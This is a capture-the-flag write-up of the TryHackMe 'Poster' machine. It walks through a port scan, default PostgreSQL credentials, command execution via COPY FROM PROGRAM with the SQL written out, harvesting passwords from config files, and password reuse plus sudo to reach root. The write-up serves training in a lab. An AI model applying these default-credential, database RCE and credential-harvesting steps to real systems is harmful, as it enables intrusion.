# TryHackMe - Poster

**Difficulty:** Medium | **Category:** SQL / Boot2Root | **Time:** 45 min

## Summary
A boot2root machine exposing a custom CMS with a **misconfigured PostgreSQL instance**. Initial access comes from default credentials on the database, leading to RCE via PostgreSQL's `COPY FROM PROGRAM`. Privilege escalation relies on **password reuse** across services and `sudo` misconfiguration.

## Reconnaissance

### Port scan
```bash
nmap -sC -sV -p 22,80,4444,5432 <TARGET_IP>
```

**Results:**
- `22/tcp` - OpenSSH 7.2p2 (Ubuntu 16.04)
- `80/tcp` - Apache 2.4.18 (Poster CMS)
- `4444/tcp` - Custom service (banner: `id; whoami; hostname`)
- `5432/tcp` - PostgreSQL 9.5.21

## Exploitation - Step 1: PostgreSQL RCE

**Default credentials:** `postgres:password`

RCE via `COPY FROM PROGRAM`:

```sql
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'id | base64 -w0';
SELECT * FROM cmd_output;
DROP TABLE cmd_output;
```

A Python script (`pg_exec.py`) automates this: creates the table, injects the command, dumps the output in base64, drops the table.

The `postgres` account runs as `uid=109(postgres) gid=117(postgres)`.

## Exploitation - Step 2: Password reuse to user shell

**Enumeration of the filesystem (as postgres):**

- `/var/www/html/config.php` contains database credentials:
  ```php
  $dbuname = "alison";
  $dbpass = "p4ssw0rdS3cur3!#";
  ```
- `/home/dark/credentials.txt` contains: `dark:qwerty1234#!hackme`
- `/etc/passwd` lists local users: `alison`, `dark`

**Password reuse:** the database password is also the login password for user `alison`.

**Switch user via PTY:**
```python
su('alison', 'p4ssw0rdS3cur3!#', 'cat /home/alison/user.txt')
```

## Flag 1 - user.txt

Retrieved from `/home/alison/user.txt`. Format: `THM{...}`.

*Flag value kept private per TryHackMe content rules.*

## Exploitation - Step 3: Privesc root

- `alison` is in the `sudo` group (`groups: adm, cdrom, sudo, ...`)
- `sudo -S` with alison's own password:

```bash
echo 'p4ssw0rdS3cur3!#' | sudo -S cat /root/root.txt
```

## Flag 2 - root.txt

Retrieved from `/root/root.txt`. Format: `THM{...}`.

*Flag value kept private per TryHackMe content rules.*

## Key Takeaways

1. **Default DB credentials** - always test `postgres:password`, `root:root`, `admin:admin` on exposed database ports.
2. **PostgreSQL `COPY FROM PROGRAM`** = direct RCE when the DB user has superuser privileges.
3. **Password reuse across services** - a single leaked credential can chain DB access to system user to root.
4. **`sudo` without target restriction** - if a user is in the `sudo` group and can pass their own password, it is instant root.
5. **Filesystem enumeration** - always read `config.php`, `credentials.txt`, `.env` when you land as a service account.
